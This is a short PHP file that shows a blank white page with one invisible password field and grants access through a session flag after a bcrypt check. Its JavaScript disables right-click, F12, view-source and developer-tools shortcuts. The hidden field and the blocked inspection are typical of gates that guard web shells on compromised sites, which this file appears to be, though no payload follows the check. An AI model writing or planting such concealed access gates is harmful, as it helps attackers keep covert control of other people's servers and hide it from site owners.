<?php
session_start();
date_default_timezone_set("Asia/Jakarta");
function show_login_page() {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: flex-start;
            align-items: flex-end;
            background-color: white !important;
        }
        form {
            margin: 10px;
        }
        input {
            border: none;
            outline: none;
            background: transparent;
        }
        input:focus {
            border: none;
        }
    </style>
    <script>
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });
        document.addEventListener('keydown', function(e) {
            if (e.key === "F12" || 
                (e.ctrlKey && e.shiftKey && e.key === "I") || 
                (e.ctrlKey && e.shiftKey && e.key === "J") || 
                (e.ctrlKey && e.key === "U")) {
                e.preventDefault();
            }
        });
    </script>
</head>
<body oncontextmenu="return false">
    <form method="POST">
        <input type="password" id="password" name="pass" placeholder="">
    </form>
</body>
</html>
<?php
    exit;
}
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2y$10$XZ.gQZx8RX8n72PV19Fn7eC24vdku28vrr836p6fMEsOXa2aH.9nG';
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
        $_SESSION['authenticated'] = true;
    } else {
        show_login_page();
    }
}
?>
